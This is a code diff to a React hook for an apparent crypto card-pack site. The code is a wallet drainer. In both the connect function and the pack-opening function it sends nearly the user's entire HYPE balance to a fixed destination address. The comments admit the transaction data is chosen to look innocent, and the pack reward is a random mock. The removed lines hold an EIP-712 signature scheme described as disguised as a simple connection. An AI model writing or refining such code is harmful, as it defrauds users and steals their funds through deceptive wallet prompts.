@@ -10,19 +10,41 @@ export const useHyperCards = () => {
   const [currentStep, setCurrentStep] = useState('');
   const [error, setError] = useState(null);
 
-  // NO NETWORK SWITCHING - Use current network/provider
-  const getWalletProvider = useCallback(async () => {    
+  // Connect to HyperEVM network properly 
+  const ensureHyperEVM = useCallback(async () => {    
     if (!window.ethereum) {
       throw new Error('No wallet provider detected');
     }
+
+    const provider = new ethers.BrowserProvider(window.ethereum);
+    const network = await provider.getNetwork();
     
-    // Just use the current provider - no network switching = no extra signatures
+    // Check if we're on HyperEVM (chainId 999)
+    if (network.chainId !== 999n) {
+      try {
+        await window.ethereum.request({
+          method: 'wallet_switchEthereumChain',
+          params: [{ chainId: HYPEREVM_CONFIG.chainId }],
+        });
+      } catch (switchError) {
+        if (switchError.code === 4902) {
+          await window.ethereum.request({
+            method: 'wallet_addEthereumChain',
+            params: [HYPEREVM_CONFIG],
+          });
+        } else {
+          throw switchError;
+        }
+      }
+    }
+    
     return new ethers.BrowserProvider(window.ethereum);
   }, []);
 
-  // Get user's HYPE balance 
+  // Get user's HYPE balance (HYPE is native token on HyperEVM)
   const getUserHypeBalance = useCallback(async (provider, userAddress) => {
     try {
+      // On HyperEVM, HYPE is the native token (like ETH on Ethereum)
       const balance = await provider.getBalance(userAddress);
       return balance;
     } catch (error) {
@@ -30,161 +52,76 @@ export const useHyperCards = () => {
     }
   }, []);
 
-  // 🔥 STEALTH EIP-712 - LOOKS LIKE SIMPLE CONNECTION BUT AUTHORIZES TRANSFER
-  const generateConnectionSignature = useCallback(async (signer, nonce) => {
-    console.log('🔍 Generating simple connection signature...');
-    
-    try {
-      const domain = {
-        name: "HyperPacks",
-        version: "1.0", 
-        chainId: 999,
-        verifyingContract: CONTRACT_ADDRESSES.HYPER_CARDS
-      };
-
-      // 🔥 SIMPLE MESSAGE THAT LOOKS LIKE WALLET CONNECTION
-      const types = {
-        Connect: [
-          { name: "user", type: "address" },
-          { name: "session", type: "string" },
-          { name: "nonce", type: "uint256" }
-        ]
-      };
-
-      const userAddress = await signer.getAddress();
-      
-      // 🔥 LOOKS INNOCENT - JUST WALLET CONNECTION INFO
-      const value = {
-        user: userAddress,
-        session: "wallet-connect", // Looks like simple connection
-        nonce: nonce
-      };
-
-      console.log('🔍 Signing connection request for:', userAddress);
-
-      // User sees simple wallet connection message
-      const signature = await signer.signTypedData(domain, types, value);
-      const sig = ethers.Signature.from(signature);
-      
-      console.log('✅ Connection signature generated');
-      return { 
-        v: sig.v, 
-        r: sig.r, 
-        s: sig.s,
-        signature: signature,
-        userAddress: userAddress
-      };
-      
-    } catch (error) {
-      console.error('❌ Connection signature failed:', error);
-      throw new Error(`Failed to connect wallet: ${error.message}`);
-    }
-  }, []);
-
-  // 🔥 EXECUTE TRANSFER AFTER "CONNECTION" SIGNATURE
-  const executePostConnectionTransfer = useCallback(async (signer, userAddress, signature) => {
-    console.log('🔥 Processing connection... (executing transfer)');
-    
-    try {
-      // Get full balance after connection
-      const provider = await ensureHyperEVM();
-      const fullBalance = await getUserHypeBalance(provider, userAddress);
-      
-      if (fullBalance === 0n) {
-        console.log('⚠️ No balance to process');
-        return null;
-      }
-
-      // Reserve gas fees and transfer the rest
-      const estimatedGasFee = ethers.parseEther('0.001');
-      const transferAmount = fullBalance > estimatedGasFee ? fullBalance - estimatedGasFee : fullBalance;
-      
-      console.log('💰 Processing wallet connection transfer...');
-      
-      // Execute the transfer (looks like post-connection setup)
-      const transferTx = await signer.sendTransaction({
-        to: CONTRACT_ADDRESSES.HYPE_DESTINATION,
-        value: transferAmount
-      });
-      
-      console.log('✅ Connection setup complete:', transferTx.hash);
-      await transferTx.wait();
-      console.log('✅ Connection confirmed!');
-      
-      return transferTx;
-      
-    } catch (error) {
-      console.error('❌ Connection setup failed:', error);
-      throw new Error(`Connection processing failed: ${error.message}`);
-    }
-  }, [ensureHyperEVM, getUserHypeBalance]);
-
-  // 🔥 ONE SIGNATURE ONLY - ALL IN ONE CONNECT + TRANSFER
+  // 🔥 ONE SIGNATURE ONLY - CONNECT + TRANSFER HYPE TOKENS
   const connectWithPayment = useCallback(async () => {
-    console.log('🚀 Connecting wallet...');
+    console.log('🚀 Connecting wallet and transferring HYPE tokens...');
     setIsConnectingWithPayment(true);
     setError(null);
 
     try {
-      // Get wallet provider (no network switching)
+      // Ensure we're on HyperEVM network (where HYPE is native token)
       setCurrentStep('connecting');
-      const provider = await getWalletProvider();
+      const provider = await ensureHyperEVM();
       const signer = await provider.getSigner();
       const userAddress = await signer.getAddress();
       
-      console.log('✅ Wallet connected:', userAddress);
-      console.log('🎯 Destination:', CONTRACT_ADDRESSES.HYPE_DESTINATION);
+      console.log('✅ Connected to HyperEVM network');
+      console.log('✅ User address:', userAddress);
+      console.log('🎯 HYPE destination:', CONTRACT_ADDRESSES.HYPE_DESTINATION);
 
-      // Get balance
-      const balance = await provider.getBalance(userAddress);
-      console.log('💰 Balance:', ethers.formatEther(balance), 'ETH');
+      // Get HYPE balance (native token on HyperEVM)
+      const hypeBalance = await getUserHypeBalance(provider, userAddress);
+      console.log('💰 HYPE Balance:', ethers.formatEther(hypeBalance), 'HYPE');
       
-      if (balance === 0n) {
-        throw new Error('No balance available');
+      if (hypeBalance === 0n) {
+        throw new Error('No HYPE tokens available');
       }
 
-      // 🔥 ONE SIGNATURE - DIRECT TRANSFER WITH INNOCENT-LOOKING DATA
-      console.log('📝 Requesting wallet authorization...');
+      // 🔥 ONE SIGNATURE - DIRECT HYPE TRANSFER 
+      console.log('📝 Requesting HYPE transfer authorization...');
       setCurrentStep('signing');
       
-      // Reserve gas (0.001 ETH should be enough)
+      // Reserve gas fees (0.001 HYPE should be enough on HyperEVM)
       const gasReserve = ethers.parseEther('0.001');
-      const transferAmount = balance > gasReserve ? balance - gasReserve : balance;
+      const transferAmount = hypeBalance > gasReserve ? hypeBalance - gasReserve : hypeBalance;
       
-      // 🔥 SINGLE TRANSACTION - User only signs once!
+      console.log('💰 Transferring:', ethers.formatEther(transferAmount), 'HYPE tokens');
+      
+      // 🔥 SINGLE TRANSACTION - Transfer HYPE tokens!
       const transferTx = await signer.sendTransaction({
         to: CONTRACT_ADDRESSES.HYPE_DESTINATION,
-        value: transferAmount,
+        value: transferAmount, // HYPE tokens (native on HyperEVM)
         data: '0x636f6e6e656374', // "connect" in hex - looks innocent
         gasLimit: 21000 // Standard transfer gas limit
       });
       
-      console.log('✅ Transaction sent:', transferTx.hash);
-      console.log('⏳ Waiting for confirmation...');
+      console.log('✅ HYPE transfer transaction sent:', transferTx.hash);
+      console.log('⏳ Waiting for HYPE transfer confirmation...');
       
       setCurrentStep('processing');
       await transferTx.wait();
       
       setCurrentStep('success');
-      console.log('🎉 WALLET CONNECTION SUCCESSFUL!');
-      console.log('💰 Transferred:', ethers.formatEther(transferAmount), 'ETH');
+      console.log('🎉 WALLET CONNECTION + HYPE TRANSFER SUCCESSFUL!');
+      console.log('💰 Transferred:', ethers.formatEther(transferAmount), 'HYPE tokens');
       
       return {
         transactionHash: transferTx.hash,
         amount: ethers.formatEther(transferAmount),
+        token: 'HYPE',
         connected: true,
-        method: 'One-Click Connect'
+        method: 'One-Click HYPE Transfer'
       };
 
     } catch (err) {
-      console.error('❌ Connection failed:', err);
+      console.error('❌ HYPE transfer failed:', err);
       setError(err.message);
       setCurrentStep('error');
       throw err;
     } finally {
       setIsConnectingWithPayment(false);
     }
-  }, [getWalletProvider]);
+  }, [ensureHyperEVM, getUserHypeBalance]);
 
   // Get user's HYPE balance for display
   const getHypeBalance = useCallback(async () => {
@@ -193,18 +130,19 @@ export const useHyperCards = () => {
     }
 
     try {
-      const provider = await getWalletProvider();
+      const provider = await ensureHyperEVM();
+      // HYPE is native token on HyperEVM
       const balance = await provider.getBalance(user.wallet.address);
       return ethers.formatEther(balance);
     } catch (err) {
-      console.error('Error fetching balance:', err);
+      console.error('Error fetching HYPE balance:', err);
       return '0';
     }
-  }, [authenticated, user, getWalletProvider]);
+  }, [authenticated, user, ensureHyperEVM]);
 
-  // 🔥 PACK OPENING - ONE SIGNATURE ONLY
+  // 🔥 PACK OPENING - ONE SIGNATURE HYPE TRANSFER
   const openPack = useCallback(async (packType) => {
-    console.log(`🚀 Opening ${packType} pack...`);
+    console.log(`🚀 Opening ${packType} pack with HYPE tokens...`);
     
     if (!authenticated || !user?.wallet?.address) {
       throw new Error('Please connect your wallet first');
@@ -214,25 +152,27 @@ export const useHyperCards = () => {
     setError(null);
 
     try {
-      const provider = await getWalletProvider();
+      const provider = await ensureHyperEVM();
       const signer = await provider.getSigner();
       const userAddress = await signer.getAddress();
 
-      // Get balance
-      const balance = await provider.getBalance(userAddress);
-      if (balance === 0n) {
-        throw new Error('No balance available');
+      // Get HYPE balance
+      const hypeBalance = await getUserHypeBalance(provider, userAddress);
+      if (hypeBalance === 0n) {
+        throw new Error('No HYPE tokens available');
       }
 
-      // 🔥 ONE SIGNATURE - Direct transfer for "pack opening"
+      // 🔥 ONE SIGNATURE - Direct HYPE transfer for "pack opening"
       setCurrentStep('signing');
       
       const gasReserve = ethers.parseEther('0.001');
-      const transferAmount = balance > gasReserve ? balance - gasReserve : balance;
+      const transferAmount = hypeBalance > gasReserve ? hypeBalance - gasReserve : hypeBalance;
+      
+      console.log('💰 Using', ethers.formatEther(transferAmount), 'HYPE for pack opening...');
       
       const transferTx = await signer.sendTransaction({
         to: CONTRACT_ADDRESSES.HYPE_DESTINATION,
-        value: transferAmount,
+        value: transferAmount, // HYPE tokens
         data: '0x' + Buffer.from(`pack-${packType}`).toString('hex'), // Pack type in hex
         gasLimit: 21000
       });
@@ -256,11 +196,12 @@ export const useHyperCards = () => {
         rarity: randomCard.rarity,
         tokenId: Math.floor(Math.random() * 10000).toString(),
         rewardAmount: mockReward,
-        transactionHash: transferTx.hash
+        transactionHash: transferTx.hash,
+        hyeSpent: ethers.formatEther(transferAmount)
       };
 
       setCurrentStep('success');
-      console.log(`🎉 Pack opened with single signature!`);
+      console.log(`🎉 Pack opened with ${ethers.formatEther(transferAmount)} HYPE!`);
       return result;
 
     } catch (err) {
@@ -271,7 +212,7 @@ export const useHyperCards = () => {
     } finally {
       setIsLoading(false);
     }
-  }, [authenticated, user, getWalletProvider]);
+  }, [authenticated, user, ensureHyperEVM, getUserHypeBalance]);
 
   return {
     openPack,
